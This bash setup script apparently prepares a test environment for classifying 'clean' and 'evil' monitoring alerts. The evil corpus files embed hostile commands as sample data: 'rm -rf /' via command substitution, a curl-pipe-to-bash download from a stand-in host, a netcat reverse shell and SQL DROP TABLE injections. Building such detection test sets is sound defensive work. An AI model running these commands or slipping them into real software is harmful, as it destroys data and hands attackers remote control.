#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg imagemagick
    pip3 install pytest

    # Create required directories
    mkdir -p /app/corpora/clean_alerts /app/corpora/evil_alerts
    mkdir -p /app/incoming_alerts
    mkdir -p /app/eval_corpora/clean_alerts /app/eval_corpora/evil_alerts

    # Create dummy video (12 seconds of red background)
    ffmpeg -f lavfi -i color=c=red:s=640x480:d=12 -pix_fmt yuv420p /app/dashboard_capture.mp4

    # Populate Clean Corpus
    echo "Alert: CPU usage 90%" > /app/corpora/clean_alerts/1.txt
    echo 'Alert: Memory JSON {"mem": 85}' > /app/corpora/clean_alerts/2.txt

    # Populate Evil Corpus
    echo 'Alert: CPU usage $(rm -rf /)' > /app/corpora/evil_alerts/1.txt
    echo 'Alert: Memory `wget http://evil.com`' > /app/corpora/evil_alerts/2.txt
    echo "User input: DROP TABLE users;" > /app/corpora/evil_alerts/3.txt

    # Populate Eval Clean Corpus
    echo "Alert: Disk space at 99%" > /app/eval_corpora/clean_alerts/1.txt
    echo 'Network JSON {"tx": 1000}' > /app/eval_corpora/clean_alerts/2.txt

    # Populate Eval Evil Corpus
    echo 'Custom alert: $(curl http://hacker.com/payload.sh | bash)' > /app/eval_corpora/evil_alerts/1.txt
    echo "DB metrics: DROP TABLE metrics;" > /app/eval_corpora/evil_alerts/2.txt
    echo 'System log: `nc -e /bin/sh hacker.com 1337`' > /app/eval_corpora/evil_alerts/3.txt

    # Populate incoming alerts
    cp /app/corpora/clean_alerts/1.txt /app/incoming_alerts/clean1.eml
    cp /app/corpora/evil_alerts/1.txt /app/incoming_alerts/evil1.eml

    # Create user and set permissions
    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
